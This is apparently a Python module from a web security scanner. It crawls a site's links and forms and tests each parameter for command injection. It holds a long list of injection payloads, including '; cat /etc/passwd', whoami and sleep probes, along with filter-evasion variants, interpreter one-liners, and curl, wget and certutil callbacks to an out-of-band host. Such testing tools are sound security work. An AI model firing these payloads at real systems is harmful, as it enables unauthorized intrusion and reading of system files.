# -*- coding: utf-8 -*-
"""
Command Injection Scanner Module
Módulo para detecção de vulnerabilidades de Command Injection.
"""

import requests
import re
import datetime
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn

from ..core.logger import get_logger
from ..utils.network import create_session


class CommandInjectionScanner:
    """Scanner para detecção de vulnerabilidades de Command Injection."""

    def __init__(self, base_url):
        self.base_url = base_url
        self.session = create_session()
        self.vulnerable_points = []
        self.payloads = self._get_default_payloads()
        
        # Parâmetros configuráveis
        self.level = 1
        self.target_os = 'auto'
        self.time_delay = 5.0
        self.verbose = False
        
        self.logger = get_logger(__name__)
        self.console = Console()

    def _get_default_payloads(self):
        """Retorna payloads de Command Injection padrão com técnicas de evasão avançadas."""
        base_payloads = [
            # Unix/Linux commands
            "; whoami", "&& whoami", "| whoami",
            "; id", "&& id", "| id",
            "; uname -a", "&& uname -a", "| uname -a",
            "; cat /etc/passwd", "&& cat /etc/passwd", "| cat /etc/passwd",
            "; ls -la", "&& ls -la", "| ls -la",
            "`whoami`", "$(whoami)", "`id`", "$(id)", "`uname -a`", "$(uname -a)",
            
            # Windows commands
            "; dir", "&& dir", "| dir",
            "; whoami", "&& whoami", "| whoami",
            "; systeminfo", "&& systeminfo", "| systeminfo",
            "; ipconfig", "&& ipconfig", "| ipconfig",
            "; net user", "&& net user", "| net user",
            
            # Time-based detection
            "; sleep 5", "&& sleep 5", "| sleep 5",
            "; ping -c 5 127.0.0.1", "&& ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1",
            "; timeout 5", "&& timeout 5", "| timeout 5",
            "; ping -n 5 127.0.0.1", "&& ping -n 5 127.0.0.1", "| ping -n 5 127.0.0.1"
        ]
        
        # Técnicas de evasão avançadas
        evasion_techniques = []
        
        for payload in base_payloads[:20]:  # Aplicar evasões aos primeiros 20 payloads principais
            # 1. URL Encoding
            evasion_techniques.append(payload.replace(";", "%3B").replace("&", "%26").replace("|", "%7C").replace(" ", "%20"))
            
            # 2. Double URL Encoding
            evasion_techniques.append(payload.replace(";", "%253B").replace("&", "%2526").replace("|", "%257C").replace(" ", "%2520"))
            
            # 3. Unicode Encoding
            evasion_techniques.append(payload.replace(";", "\\u003B").replace("&", "\\u0026").replace("|", "\\u007C"))
            
            # 4. Hex Encoding
            evasion_techniques.append(payload.replace(" ", "\\x20").replace(";", "\\x3B").replace("&", "\\x26"))
            
            # 5. Case Variations (para Windows)
            if "dir" in payload.lower() or "whoami" in payload.lower():
                evasion_techniques.append(payload.replace("dir", "DiR").replace("whoami", "WhOaMi"))
            
            # 6. Alternative separators
            evasion_techniques.append(payload.replace(";", "&&"))
            evasion_techniques.append(payload.replace("&&", ";"))
            evasion_techniques.append(payload.replace("|", "&&"))
            
            # 7. Null byte injection
            evasion_techniques.append(payload + "%00")
            evasion_techniques.append(payload + "\\x00")
            
            # 8. Comment injection
            evasion_techniques.append(payload + "#")
            evasion_techniques.append(payload + "/*")
            
            # 9. Space alternatives
            evasion_techniques.append(payload.replace(" ", "\t"))
            evasion_techniques.append(payload.replace(" ", "${IFS}"))
            evasion_techniques.append(payload.replace(" ", "$IFS"))
            evasion_techniques.append(payload.replace(" ", "<"))
            
            # 10. Concatenation techniques
            if "whoami" in payload:
                evasion_techniques.append(payload.replace("whoami", "who'ami"))
                evasion_techniques.append(payload.replace("whoami", "who\"ami"))
                evasion_techniques.append(payload.replace("whoami", "who$'ami'"))
                evasion_techniques.append(payload.replace("whoami", "wh\\oami"))
                
            # 11. Alternative command forms
            if "cat" in payload:
                evasion_techniques.append(payload.replace("cat", "ca\\t"))
                evasion_techniques.append(payload.replace("cat", "c'a't"))
                evasion_techniques.append(payload.replace("cat", "c\"a\"t"))
                
            # 12. Variable expansion
            evasion_techniques.append(payload.replace("whoami", "${HOME%/*}/bin/whoami"))
            evasion_techniques.append(payload.replace("id", "/usr/bin/i\\d"))
            
            # 13. Backtick vs $() variations
            if "`" in payload:
                evasion_techniques.append(payload.replace("`", "$(").replace("`", ")"))
            elif "$(" in payload:
                evasion_techniques.append(payload.replace("$(", "`").replace(")", "`"))
                
            # 14. Wildcard obfuscation
            evasion_techniques.append(payload.replace("whoami", "w*ami"))
            evasion_techniques.append(payload.replace("whoami", "who?mi"))
            evasion_techniques.append(payload.replace("id", "i?"))
            
            # 15. Environment variable abuse
            evasion_techniques.append(payload.replace("whoami", "$USER"))
            evasion_techniques.append(payload.replace("id", "$UID"))

            # 16. Arithmetic expansion
            evasion_techniques.append(payload.replace("5", "$((5))"))
            evasion_techniques.append(payload.replace("5", "$[5]"))

            # 17. Process substitution
            if "cat" in payload:
                evasion_techniques.append(payload.replace("cat /etc/passwd", "< /etc/passwd"))

            # 18. ANSI-C Quoting
            evasion_techniques.append(payload.replace("whoami", "$'whoami'"))

            # 19. Brace expansion
            evasion_techniques.append(payload.replace("whoami", "{whoami}"))

            # 20. Variable indirection
            evasion_techniques.append(payload.replace("whoami", "${!#}whoami"))

        # Técnicas específicas avançadas
        advanced_payloads = [
            # Bash-specific evasions
            "; ${PATH%%/usr*}/whoami",
            "; $(echo 'whoami')",
            "; echo $(whoami)",
            "; w'h'o'a'm'i",
            "; wh\\o\\am\\i",
            "; who$@ami",
            "; ${HOME%/*}/bin/whoami",
            "; /???/???/whoami",
            "; /???/bin/i?",
            
            # PowerShell-specific evasions (Windows)
            "; powershell -c whoami",
            "; powershell.exe -w hidden -c whoami",
            "; powershell -ep bypass -c whoami",
            "; pwsh -c whoami",
            "&& cmd /c whoami",
            "&& cmd.exe /c dir",
            
            # Alternative execution methods
            "; perl -e 'system(\"whoami\")'",
            "; python -c 'import os; os.system(\"whoami\")'",
            "; ruby -e 'system(\"whoami\")'",
            "; php -r 'system(\"whoami\");'",
            "; node -e 'require(\"child_process\").exec(\"whoami\")'",
            
            # File-based techniques
            "; echo whoami > /tmp/cmd; sh /tmp/cmd",
            "; echo 'whoami' | sh",
            "; echo whoami | /bin/bash",
            
            # Redirection abuse
            "; whoami < /dev/null",
            "; whoami > /dev/null",
            "; whoami 2>&1",
            "; whoami >&2",
            
            # Process substitution
            "; cat <(whoami)",
            "; $(< <(echo whoami))",
            
            # ANSI-C Quoting
            "; $'\\x77\\x68\\x6f\\x61\\x6d\\x69'",  # whoami in hex
            "; $'who\\ami'",
            
            # Here documents
            "; cat << EOF | sh\\nwhoami\\nEOF",
            
            # Logic operators
            "; true && whoami",
            "; false || whoami",
            "; whoami && true",
            "; whoami || false",
            
            # Arithmetic expansion
            "; $((1)) && whoami",
            "; let 1 && whoami"
        ]

        # Combinar payloads base com técnicas de evasão
        all_payloads = base_payloads + evasion_techniques
        
        # Remover duplicatas mantendo ordem
        seen = set()
        unique_payloads = []
        for payload in all_payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        return unique_payloads

    def _detect_command_execution(self, response_text, payload):
        """Detecta evidências de execução de comandos."""
        evidence_patterns = [
            # Unix/Linux patterns
            r'root:|nobody:|daemon:|www-data:',  # /etc/passwd patterns
            r'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)',  # id command output
            r'Linux.*\d+\.\d+\.\d+',  # uname output
            r'total\s+\d+',  # ls -la output
            r'drwx|rwx',  # directory permissions
            # Windows patterns
            r'Directory of [A-Z]:\\',  # dir command
            r'Volume.*Serial Number',  # dir command
            r'<DIR>',  # directory listing
            r'NT AUTHORITY\\SYSTEM',  # whoami on Windows
            r'Windows.*Version.*Build',  # systeminfo
            r'Ethernet adapter|Wireless adapter',  # ipconfig
            r'User accounts for',  # net user
            # Generic patterns
            r'command not found',
            r'is not recognized as an internal',
            r'Permission denied',
            r'Access is denied',
            # Process indicators
            r'root\s+\d+\s+',  # process listing
            r'administrator\s+',
            r'system\s+',
        ]
        
        for pattern in evidence_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE):
                return True, pattern
        
        return False, None

    def _detect_time_based_injection(self, response_time, payload):
        """Detecta command injection baseado em tempo de resposta com threshold adaptativo."""
        time_based_payloads = ['sleep', 'timeout', 'ping']

        if not any(cmd in payload.lower() for cmd in time_based_payloads):
            return False

        # Usa threshold dinâmico: max(4.0, baseline * 2) — evita FP em alvos lentos
        threshold = getattr(self, '_cmd_timing_threshold', 4.0)
        return response_time > threshold

    def _measure_cmd_baseline_rtt(self, url: str, method: str = 'get',
                                   samples: int = 3) -> float:
        """
        Mede RTT baseline do alvo para calcular threshold de timing adaptativo.
        Chama antes do scan principal para evitar falsos positivos.
        """
        timings = []
        for _ in range(samples):
            try:
                start = datetime.datetime.now()
                self.session.get(url, timeout=10, verify=False)
                elapsed = (datetime.datetime.now() - start).total_seconds()
                timings.append(elapsed)
            except Exception:
                pass
        baseline = sum(timings) / len(timings) if timings else 1.0
        # Threshold = máx(4.0, 2× baseline) — garante margem mínima de 4s
        self._cmd_timing_threshold = max(4.0, baseline * 2)
        self.logger.debug(f"Baseline RTT: {baseline:.2f}s | Threshold timing: {self._cmd_timing_threshold:.2f}s")
        return baseline

    def add_oast_payloads(self, oast_host: str) -> None:
        """
        Adiciona payloads OOB DNS (Out-of-Band) para detecção blind
        de command injection via callback OAST.

        Args:
            oast_host: Hostname OAST gerado por OASTClient.generate_host()
        """
        oob_payloads = [
            # Unix — nslookup, dig, curl, wget
            f"; nslookup {oast_host}",
            f"&& nslookup {oast_host}",
            f"| nslookup {oast_host}",
            f"; dig {oast_host}",
            f"; curl http://{oast_host}/ci",
            f"; wget -q http://{oast_host}/ci -O /dev/null",
            f"`nslookup {oast_host}`",
            f"$(nslookup {oast_host})",
            # Windows — nslookup + certutil
            f"; nslookup {oast_host} && echo done",
            f"& nslookup {oast_host}",
            f"| certutil -urlcache -split -f http://{oast_host}/ci NUL",
            # Evasão com IFS
            f";$IFS$()nslookup$IFS${oast_host}",
            # Backtick com nslookup
            f"`;nslookup {oast_host};`",
        ]
        # Adiciona sem duplicar payloads já existentes
        existing = set(self.payloads)
        for p in oob_payloads:
            if p not in existing:
                self.payloads.append(p)
                existing.add(p)
        self.logger.debug(f"Adicionados {len(oob_payloads)} payloads OOB para OAST host: {oast_host}")

    def _scan_target(self, url, method, param, form_data=None):
        """Escaneia um parâmetro específico para command injection."""
        for payload in self.payloads:
            try:
                start_time = datetime.datetime.now()
                
                test_data = {param: payload}
                if method.lower() == 'get': 
                    response = self.session.get(url, params=test_data, timeout=10, verify=False)
                else:
                    post_payload = (form_data or {}).copy()
                    post_payload[param] = payload
                    response = self.session.post(url, data=post_payload, timeout=10, verify=False)
                
                end_time = datetime.datetime.now()
                response_time = (end_time - start_time).total_seconds()
                
                # Detecta evidências de execução
                executed, evidence_pattern = self._detect_command_execution(response.text, payload)
                time_based = self._detect_time_based_injection(response_time, payload)
                
                if executed or time_based:
                    detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                    
                    if executed:
                        rec = f"Payload '{payload}' executado. Evidência: padrão '{evidence_pattern}' detectado na resposta."
                        risk = "Crítico"
                        vuln_type = "Command Injection"
                    elif time_based:
                        rec = f"Payload '{payload}' pode ter sido executado (tempo de resposta: {response_time:.2f}s). Verificar manualmente."
                        risk = "Alto"
                        vuln_type = "Command Injection (Time-based)"
                    
                    finding = {
                        "Risco": risk, 
                        "Tipo": vuln_type, 
                        "Detalhe": detail, 
                        "Recomendação": rec
                    }
                    
                    if finding not in self.vulnerable_points: 
                        self.vulnerable_points.append(finding)
                        self.logger.info(f"Vulnerabilidade Command Injection detectada: {vuln_type} - {detail}")
                    return  # Para após primeira detecção
                    
            except requests.RequestException:
                pass

    def run_scan(self, return_findings=False):
        """Executa o scan de Command Injection."""
        if not return_findings:
            self.console.print("-" * 60)
            self.console.print(f"[*] Executando scanner de Command Injection em: [bold cyan]{self.base_url}[/bold cyan]")
            self.console.print("-" * 60)
            
        try:
            with self.console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: 
                self.console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        tasks = []
        # Coleta links com parâmetros
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query): 
                tasks.append(('get', base, param, None))

        # Coleta formulários
        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data: 
                tasks.append((method, action, param, data))
        
        if not tasks:
            if not return_findings: 
                self.console.print("[yellow]Nenhum ponto de entrada encontrado para testar Command Injection.[/yellow]")
            return [] if return_findings else None

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=self.console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando Command Injection...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        if return_findings: 
            return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        """Apresenta os resultados do scan de Command Injection."""
        self.console.print("-" * 60)
        if not self.vulnerable_points:
            self.console.print("[bold green][+] Nenhuma vulnerabilidade de Command Injection foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de Command Injection Encontradas")
            table.add_column("Risco", style="cyan")
            table.add_column("Tipo", style="yellow")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")
            
            risk_order = {"Crítico": 0, "Alto": 1, "Médio": 2, "Baixo": 3}
            sorted_findings = sorted(self.vulnerable_points, key=lambda x: risk_order.get(x["Risco"], 99))

            for f in sorted_findings:
                risk_style = "red" if f['Risco'] in ['Crítico', 'Alto'] else "yellow"
                table.add_row(f"[{risk_style}]{f['Risco']}[/{risk_style}]", f['Tipo'], f['Detalhe'], f['Recomendação'])
            self.console.print(table)
        self.console.print("-" * 60)


def command_injection_scan(url, level=1, target_os='auto', time_delay=5.0, verbose=False, return_findings=False):
    """
    Executa scan de Command Injection em uma URL.
    
    Args:
        url (str): URL alvo para o scan
        level (int): Nível de agressividade (1-3)
        target_os (str): SO alvo ('linux', 'windows', 'auto')
        time_delay (float): Delay para testes time-based
        verbose (bool): Saída detalhada
        return_findings (bool): Se True, retorna lista de vulnerabilidades ao invés de imprimir
    
    Returns:
        list ou None: Lista de vulnerabilidades encontradas se return_findings=True
    """
    scanner = CommandInjectionScanner(url)
    scanner.level = level
    scanner.target_os = target_os
    scanner.time_delay = time_delay
    scanner.verbose = verbose
    return scanner.run_scan(return_findings=return_findings)
